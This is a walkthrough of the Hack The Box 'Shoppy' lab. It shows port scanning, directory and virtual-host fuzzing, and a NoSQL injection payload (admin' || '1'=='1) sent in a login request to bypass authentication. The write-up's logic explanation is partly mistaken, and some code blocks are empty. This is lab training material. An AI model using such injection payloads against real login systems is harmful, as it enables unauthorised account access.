```

Overall, there are 3 open ports; `22`, `80`, `9093`. Have no idea what the port `9093` is yet.
The `nmap` scan reveals that the domain of `http` service is `http://shoppy.htb`.
The `nginx` version doesn't seem to be vulnerable yet based on `searchsploit`.
Let's visit `http(80)` first.

### http(80)
---
![](attachments/shoppy_1.png)

The first index page shows that the service is not open yet with timer.
It looks like the site is for online shopping.. Maybe purchase, or storage services are running..?

```bash

```

`nikto` scan found that it has `/login` page. Other than that, there's nothing useful.
Also, given the find of `wp-config.php`, I think the server is running on `wordpress` and php.
Before visiting the login page, let's run `gobuster` first.

```bash

```

Several pages are found, and `/admin`, `login` pages look interesting..
Let's visit `/login` page.

![](attachments/shoppy_2.png)

It's a simple login page. `/admin` is also redirected to this login page. I checked its source code, but nothing useful. I tried to capture the request and response using `Burpsuite` but no useful information found..

Just in case if it has vHosts, let's try `ffuf`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb" -fs 169 -s
```

No other vHosts found here... What about subdomain?
Let's try finding sub-domains using `ffuf` again.

At this time, I'm using a larger wordlists : `bitquark-subdomains-top100000.txt`

```bash
┌──(kali㉿kali)-[~/htb]
└─$ wfuzz -u http://10.10.11.180 -H "Host: FUZZ.shoppy.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 169

```

`mattermost` is found here.
As long as I know, mattermost is a chat application which can be hosted locally.

I tested this login input with sqli wordlist(`/usr/share/seclists/Fuzzing/SQLi/quick-sqli.txt`), but it doesn't seem working.
Instead, let me try NoSQL Injection.

Here are some references:
https://book.hacktricks.xyz/pentesting-web/nosql-injection
https://nullsweep.com/a-nosql-injection-primer-with-mongo/

First let's catch the login request again.

```shell
{"device_id":"","login_id":"admin","password":"passwd","token":""}
```

Based on the article mentioned above, `' || 'a'=='a` can help us inject SQL.

```perl
POST /login HTTP/1.1
Host: shoppy.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
<SNIP>

username=admin%27+%7C%7C+%271%27+%3D%3D+%271&password=test
```

With this query, the expected full query is supposed to be like the following;

`'username'=='admin' || '1'=='1' && 'password'=='test'`
The formula of this will be `False || True && False` => Which ends up being `True`

Now I can see the "Shoppy App" page.
